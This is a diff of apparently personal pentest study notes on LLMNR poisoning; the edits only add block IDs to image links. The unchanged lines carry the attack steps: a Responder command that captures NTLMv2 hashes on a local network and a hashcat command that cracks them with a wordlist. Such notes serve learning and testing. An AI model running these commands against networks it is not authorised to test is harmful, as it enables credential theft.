@@ -3,7 +3,7 @@
 
 The flaw in this protocol is, it uses the user's username and the NTLMv2 hash which can be exploited by a Man in the Middle Attack.
 
-![[LLMNR Poisoning.png]]
+![[LLMNR Poisoning.png]] ^4810ce
 
 1. First we can use a tool like responder to listen to LLMNR messages in a network. 
    
@@ -25,6 +25,7 @@ sudo responder -I eth0 -dwP
 ```bash
 hashcat —m 5600 hashes.txt rockyou.txt
 ```
-   ![[LLMNR Hash Crack.png]]
+   ![[LLMNR Hash Crack.png]] ^437ee9
+   
    
 
